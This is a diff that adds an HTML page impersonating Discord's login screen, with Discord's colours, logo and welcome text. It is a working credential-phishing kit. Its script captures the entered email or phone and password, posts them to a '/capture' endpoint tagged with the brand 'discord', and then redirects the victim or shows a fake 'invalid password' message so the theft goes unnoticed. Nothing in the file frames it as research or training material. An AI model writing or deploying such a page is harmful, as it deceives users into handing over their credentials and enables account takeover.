@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Discord - Login</title>
+<style>
+  body{margin:0;font-family:gg sans,"Noto Sans",Helvetica,Arial,sans-serif;background:#313338;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#dbdee1}
+  .box{background:#313338;padding:32px;width:480px;border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2)}
+  .logo{text-align:center;margin-bottom:24px}
+  h1{font-size:24px;font-weight:600;text-align:center;margin:0 0 8px;color:#f2f3f5}
+  p{text-align:center;color:#b5bac1;margin:0 0 20px;font-size:16px}
+  label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;margin-bottom:8px}
+  input{width:100%;background:#1e1f22;border:none;border-radius:3px;padding:10px;color:#dbdee1;font-size:16px;margin-bottom:20px;box-sizing:border-box;outline:none}
+  input:focus{outline:1px solid #5865f2}
+  .btn{width:100%;background:#5865f2;color:#fff;border:none;padding:12px;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer}
+  .btn:hover{background:#4752c4}
+  .msg{color:#fa777c;font-size:14px;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">
+    <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6ca814282eca7172c6_icon_clyde_white_RGB.svg" width="100" alt="Discord">
+  </div>
+  <h1>Welcome back!</h1>
+  <p>We're so excited to see you again!</p>
+  <form id="f">
+    <label>Email or Phone Number</label>
+    <input name="user" type="text" required autofocus>
+    <label>Password</label>
+    <input name="pass" type="password" required>
+    <button type="submit" class="btn">Log In</button>
+    <p id="msg" class="msg"></p>
+  </form>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit', async e => {
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'discord'})});
+  const j = await r.json().catch(()=>({}));
+  if(j.redirect){window.location=j.redirect;return;}
+  document.getElementById('msg').textContent = 'Login or password is invalid.';
+});
+</script>
+</body>
+</html>
